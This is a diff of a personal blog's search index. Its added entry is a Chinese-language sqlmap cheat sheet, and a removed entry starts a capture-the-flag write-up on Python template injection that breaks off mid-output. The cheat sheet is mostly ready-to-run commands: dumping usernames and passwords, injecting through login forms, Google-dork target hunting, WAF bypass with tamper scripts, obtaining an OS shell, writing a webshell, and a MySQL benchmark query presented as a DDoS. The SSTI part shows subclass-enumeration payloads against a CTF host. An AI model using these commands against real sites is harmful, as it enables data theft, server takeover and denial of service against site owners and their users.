+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --dump -T </span></span><br><span class="line">admin <span class="operator">-</span>C  &quot;username,password&quot; <span class="comment">--level 2</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell"><a href="#三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell"></a>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--sql</span></span><br><span class="line"><span class="operator">-</span>shell </span><br><span class="line">Linux: sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--sql-shell</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 输入执行语句完成DDOS攻击</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark (<span class="number">99999999999</span>,<span class="number">0x70726f62616e646f70726f62616e646f70726f62616e646f</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h2><p>(1) 查找数据库</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) 通过2中的表得出列名(假如表为table_name)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T table_name <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
+
+<p>(4) 获取字段的值(假如扫描出id,user,password字段)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T table_name <span class="operator">-</span>C &quot;id,user,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h2><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p>
+<blockquote>
+<p>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
+</blockquote>
+<ol>
+<li><p>浏览器打开目标地址http:&#x2F;&#x2F; <a href="http://www.xxx.com/">www.xxx.com</a> &#x2F;Login.asp</p>
+</li>
+<li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p>
+</li>
+<li><p>点击login表单的submit按钮</p>
+</li>
+<li><p>这时候Burp会拦截到了我们的登录POST请求</p>
+</li>
+<li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
+</li>
+<li><p>运行sqlmap并使用如下命令：</p>
+</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="operator">/</span>sqlmap.py  <span class="operator">-</span> r <span class="keyword">search</span> <span class="operator">-</span> test.txt  <span class="operator">-</span> p tfUPass</span><br></pre></td></tr></table></figure>
+
+<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
+<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
+<p>几种注入方式：.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</p>
+<p>(2) 自动的搜索</p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u [url]<span class="link">http://testasp.vulnweb.com/Login.asp</span>[<span class="string">/url</span>] --forms</span><br></pre></td></tr></table></figure>
+
+<p>(3) 指定参数搜索</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span>testasp.vulnweb.com<span class="operator">/</span>Login.asp[<span class="operator">/</span>url] <span class="comment">--data &quot;tfUName=321&amp;tfUPass=321&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h2><p>inurl后面的语言是由自己定的</p>
+<p>注入过程中如果选y是注入，如果不是选n</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>g inurl:php?id<span class="operator">=</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h2><p>参数 –delay –safe-freq</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="comment">--dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1 python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</span></span><br></pre></td></tr></table></figure>
+
+<p>参数</p>
+<h2 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h2><p>注入点:<a href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="operator">-</span>v <span class="number">3</span> <span class="comment">--dbs --batch --tamper &quot;space2morehash.py&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
+<p>都是编码方式</p>
+<p>space2hash.py base64encode.py charencode.py</p>
+<h2 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php? id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="十、SQLMAP伪静态注入-1-查找数据库"><a href="#十、SQLMAP伪静态注入-1-查找数据库" class="headerlink" title="十、SQLMAP伪静态注入(1) 查找数据库"></a>十、SQLMAP伪静态注入(1) 查找数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T tablename <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
+
+<p>(4) 通过3得到字段值(假如从3中得到字段id，password)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T tablename <span class="operator">-</span>C &quot;password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h2><p>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
+<p>此处采用的是Linux系统</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.159</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span>[<span class="operator">/</span>url] <span class="comment">--os-cmd=ipconfig</span></span><br></pre></td></tr></table></figure>
+
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:&#x2F;www&#x2F;</p>
+<p>(2) 获取Shell</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.159</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span>[<span class="operator">/</span>url] <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>
+
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:&#x2F;www&#x2F;</p>
+<p>输入ipconfig&#x2F;all</p>
+<p>创建用户和删除用户</p>
+<p>只要权限足够大，你可以输入使用任何命令。</p>
+<p>其他命令参考下面：</p>
+<p>从数据库中搜索字段</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c:\tools\request.txt&quot; <span class="operator">-</span>dbms mysql <span class="operator">-</span>D dedecms <span class="operator">-</span><span class="keyword">search</span> <span class="operator">-</span>C admin,password</span><br></pre></td></tr></table></figure>
+
+<p>在dedecms数据库中搜索字段admin或者password。</p>
+<p>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<p>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<p>#示例：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c: \request.txt&quot;  <span class="operator">-</span>p id <span class="operator">-</span>dbms mysql <span class="operator">-</span>file<span class="operator">-</span>dest &quot;e:\php\htdocs\dvwa\inc\include\1. php&quot; <span class="operator">-</span>file <span class="operator">-</span>write &quot;f:\webshell\1112.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>使用shell命令：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c : \tools\request.txt&quot; <span class="operator">-</span>p id <span class="operator">-</span>dms mysql <span class="operator">-</span>os<span class="operator">-</span>shell</span><br></pre></td></tr></table></figure>
+
+<p>接下来指定网站可写目录：</p>
+<p>“E:\php\htdocs\dvwa”</p>
+<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<p>sqlmap详细命令：</p>
+<ul>
+<li>-is-dba 当前用户权限（是否为root权限）</li>
+<li>-dbs 所有数据库</li>
+<li>-current-db 网站当前数据库</li>
+<li>-users 所有数据库用户</li>
+<li>-current-user 当前数据库用户</li>
+<li>-random-agent 构造随机user-agent</li>
+<li>-passwords 数据库密码</li>
+<li>-proxy <a href="http://local:8080/">http://local:8080</a> -threads 10 (可以自定义线程加速) 代理</li>
+<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+</ul>
+<p>Options（选项）：</p>
+<ul>
+<li>-version 显示程序的版本号并退出</li>
+<li>-h, -help 显示此帮助消息并退出</li>
+<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
+</ul>
+<p>Target（目标）：</p>
+<p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<ul>
+<li>-d DIRECT 直接连接到数据库。</li>
+<li>-u URL, -url&#x3D;URL 目标URL。</li>
+<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
+<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
+<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
+<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
+</ul>
+<p>Request（请求）：</p>
+<p>这些选项可以用来指定如何连接到目标URL。</p>
+<ul>
+<li>-data&#x3D;DATA 通过POST发送的数据字符串</li>
+<li>-cookie&#x3D;COOKIE HTTP Cookie头</li>
+<li>-cookie-urlencode URL 编码生成的cookie注入</li>
+<li>-drop-set-cookie 忽略响应的Set - Cookie头信息</li>
+<li>-user-agent&#x3D;AGENT 指定 HTTP User - Agent头</li>
+<li>-random-agent 使用随机选定的HTTP User - Agent头</li>
+<li>-referer&#x3D;REFERER 指定 HTTP Referer头</li>
+<li>-headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</li>
+<li>-auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
+<li>-auth-cred&#x3D;ACRED HTTP身份验证凭据（用户名:密码）</li>
+<li>-auth-cert&#x3D;ACERT HTTP认证证书（key_file，cert_file）</li>
+<li>-proxy&#x3D;PROXY 使用HTTP代理连接到目标URL</li>
+<li>-proxy-cred&#x3D;PCRED HTTP代理身份验证凭据（用户名：密码）</li>
+<li>-ignore-proxy 忽略系统默认的HTTP代理</li>
+<li>-delay&#x3D;DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
+<li>-timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为30秒）</li>
+<li>-retries&#x3D;RETRIES 连接超时后重新连接的时间（默认3）</li>
+<li>-scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
+<li>-safe-url&#x3D;SAFURL 在测试过程中经常访问的url地址</li>
+<li>-safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的URL</li>
+</ul>
+<p>Enumeration（枚举）：</p>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p>
+<ul>
+<li>-b, -banner 检索数据库管理系统的标识</li>
+<li>-current-user 检索数据库管理系统当前用户</li>
+<li>-current-db 检索数据库管理系统当前数据库</li>
+<li>-is-dba 检测DBMS当前用户是否DBA</li>
+<li>-users 枚举数据库管理系统用户</li>
+<li>-passwords 枚举数据库管理系统用户密码哈希</li>
+<li>-privileges 枚举数据库管理系统用户的权限</li>
+<li>-roles 枚举数据库管理系统用户的角色</li>
+<li>-dbs 枚举数据库管理系统数据库</li>
+<li>-D DBname 要进行枚举的指定数据库名</li>
+<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename -columns）</li>
+<li>-tables 枚举的DBMS数据库中的表</li>
+<li>-columns 枚举DBMS数据库表列</li>
+<li>-dump 转储数据库管理系统的数据库中的表项</li>
+<li>-dump-all 转储所有的DBMS数据库表中的条目</li>
+<li>-search 搜索列（S），表（S）和&#x2F;或数据库名称（S）</li>
+<li>-C COL 要进行枚举的数据库列</li>
+<li>-U USER 用来进行枚举的数据库用户</li>
+<li>-exclude-sysdbs 枚举表时排除系统数据库</li>
+<li>-start&#x3D;LIMITSTART 第一个查询输出进入检索</li>
+<li>-stop&#x3D;LIMITSTOP 最后查询的输出进入检索</li>
+<li>-first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</li>
+<li>-last&#x3D;LASTCHAR 最后查询的输出字字符检索</li>
+<li>-sql-query&#x3D;QUERY 要执行的SQL语句</li>
+<li>-sql-shell 提示交互式SQL的shell</li>
+</ul>
+<p>Optimization（优化）：</p>
+<p>这些选项可用于优化SqlMap的性能。</p>
+<ul>
+<li>-o 开启所有优化开关</li>
+<li>-predict-output 预测常见的查询输出</li>
+<li>-keep-alive 使用持久的HTTP（S）连接</li>
+<li>-null-connection 从没有实际的HTTP响应体中检索页面长度</li>
+<li>-threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
+</ul>
+<p>Injection（注入）：</p>
+<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<ul>
+<li>-p TESTPARAMETER 可测试的参数（S）</li>
+<li>-dbms&#x3D;DBMS 强制后端的DBMS为此值</li>
+<li>-os&#x3D;OS 强制后端的DBMS操作系统为这个值</li>
+<li>-prefix&#x3D;PREFIX 注入payload字符串前缀</li>
+<li>-suffix&#x3D;SUFFIX 注入payload字符串后缀</li>
+<li>-tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</li>
+</ul>
+<p>Detection（检测）：</p>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<ul>
+<li>-level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</li>
+<li>-risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</li>
+<li>-string&#x3D;STRING 查询时有效时在页面匹配字符串</li>
+<li>-regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</li>
+<li>-text-only 仅基于在文本内容比较网页</li>
+</ul>
+<p>Techniques（技巧）：</p>
+<p>这些选项可用于调整具体的SQL注入测试。</p>
+<ul>
+<li>-technique&#x3D;TECH SQL注入技术测试（默认BEUST）</li>
+<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+<li>-union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</li>
+<li>-union-char&#x3D;UCHAR 用于暴力猜解列数的字符</li>
+</ul>
+<p>Fingerprint（指纹）：</p>
+<ul>
+<li>-f, -fingerprint 执行检查广泛的DBMS版本指纹</li>
+</ul>
+<p>Brute force（蛮力）：</p>
+<p>这些选项可以被用来运行蛮力检查。</p>
+<ul>
+<li>-common-tables 检查存在共同表</li>
+<li>-common-columns 检查存在共同列</li>
+</ul>
+<p>User-defined function injection（用户自定义函数注入）：</p>
+<p>这些选项可以用来创建用户自定义函数。</p>
+<p>-udf-inject 注入用户自定义函数</p>
+<p>-shared-lib&#x3D;SHLIB 共享库的本地路径</p>
+<p>File system access（访问文件系统）：</p>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<ul>
+<li>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</li>
+<li>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
+<li>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</li>
+</ul>
+<p>Operating system access（操作系统访问）：</p>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<ul>
+<li>-os-cmd&#x3D;OSCMD 执行操作系统命令</li>
+<li>-os-shell 交互式的操作系统的shell</li>
+<li>-os-pwn 获取一个OOB shell，meterpreter或VNC</li>
+<li>-os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
+<li>-os-bof 存储过程缓冲区溢出利用</li>
+<li>-priv-esc 数据库进程用户权限提升</li>
+<li>-msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</li>
+<li>-tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</li>
+</ul>
+<p>Windows注册表访问：</p>
+<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<ul>
+<li>-reg-read 读一个Windows注册表项值</li>
+<li>-reg-add 写一个Windows注册表项值数据</li>
+<li>-reg-del 删除Windows注册表键值</li>
+<li>-reg-key&#x3D;REGKEY Windows注册表键</li>
+<li>-reg-value&#x3D;REGVAL Windows注册表项值</li>
+<li>-reg-data&#x3D;REGDATA Windows注册表键值数据</li>
+<li>-reg-type&#x3D;REGTYPE Windows注册表项值类型</li>
+<li>这些选项可以用来设置一些一般的工作参数。</li>
+<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
+<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
+<li>-flush-session 刷新当前目标的会话文件</li>
+<li>-fresh-queries 忽略在会话文件中存储的查询结果</li>
+<li>-eta 显示每个输出的预计到达时间</li>
+<li>-update 更新SqlMap</li>
+<li>-save file保存选项到INI配置文件</li>
+<li>-batch 从不询问用户输入，使用所有默认配置。</li>
+</ul>
+<p>Miscellaneous（杂项）：</p>
+<ul>
+<li>-beep 发现SQL注入时提醒</li>
+<li>-check-payload IDS对注入payloads的检测测试</li>
+<li>-cleanup SqlMap具体的UDF和表清理DBMS</li>
+<li>-forms 对目标URL的解析和测试形式</li>
+<li>-gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
+<li>-page-rank Google dork结果显示网页排名（PR）</li>
+<li>-parse-errors 从响应页面解析数据库管理系统的错误消息</li>
+<li>-replicate 复制转储的数据到一个sqlite3数据库</li>
+<li>-tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</li>
+<li>-wizard 给初级用户的简单向导界面</li>
+</ul>
 ]]></content>
       <categories>
-        <category>杂项</category>
+        <category>CTF_Tools</category>
       </categories>
       <tags>
-        <tag>建站</tag>
-        <tag>图床</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1461,6 +1446,21 @@
       </tags>
   </entry>
   <entry>
+    <title>关于建站</title>
+    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
+    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
+<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
+<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>建站</tag>
+        <tag>图床</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>图床图片测试</title>
     <url>/2023/10/29/%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<p><img data-src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
@@ -1478,55 +1478,6 @@
       </categories>
       <tags>
         <tag>picture</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界-Web_python_template_injection</title>
-    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
-    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
-<img data-src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
-
-<p>进入靶机网址提示</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">python <span class="keyword">template</span> injection</span><br></pre></td></tr></table></figure>
-
-<p>知道这是一道python模板注入</p>
-<p>url输入 </p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/49 not found</span><br></pre></td></tr></table></figure>
-
-<p>判断存在SSTI注入</p>
-<p>查看网站模块，url输入</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">URL http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">50859</span>/[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span 